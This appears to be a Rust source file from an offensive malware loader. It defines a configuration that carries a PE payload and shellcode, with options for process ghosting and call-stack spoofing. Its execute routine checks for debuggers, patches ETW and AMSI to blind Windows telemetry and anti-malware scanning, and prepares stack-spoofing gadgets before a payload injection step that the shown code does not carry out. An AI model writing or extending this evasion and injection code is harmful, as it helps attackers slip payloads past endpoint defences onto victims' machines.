use core::ffi::c_void;

use crate::debug;
use crate::core::nt;
use crate::core::types::*;
use crate::core::{amsi, etw, spoof};

pub struct Config<'a> {
    pub pe_payload: &'a [u8],
    pub shellcode: &'a [u8],
    pub spoof_image_path: Option<&'a [u16]>,
    pub enable_stack_spoof: bool,
    pub enable_ghosting: bool,
}

pub struct State {
    pub file_handle: HANDLE,
    pub section_handle: HANDLE,
    pub process_handle: HANDLE,
    pub thread_handle: HANDLE,
    pub process_id: usize,
    pub params_remote: *mut c_void,
    pub params_size: usize,
}

pub unsafe fn execute(config: Config) -> bool {
    debug!("[INJECTION] Environment hardening");
    
    if !crate::core::anti_debug::is_safe_environment() { return false; }

    etw::patch_etw();
    amsi::patch_amsi();

    if config.enable_stack_spoof {
        spoof::initialize_spoof_gadgets();
    }

    if !config.enable_ghosting || config.pe_payload.is_empty() { return false; } 

    true    
}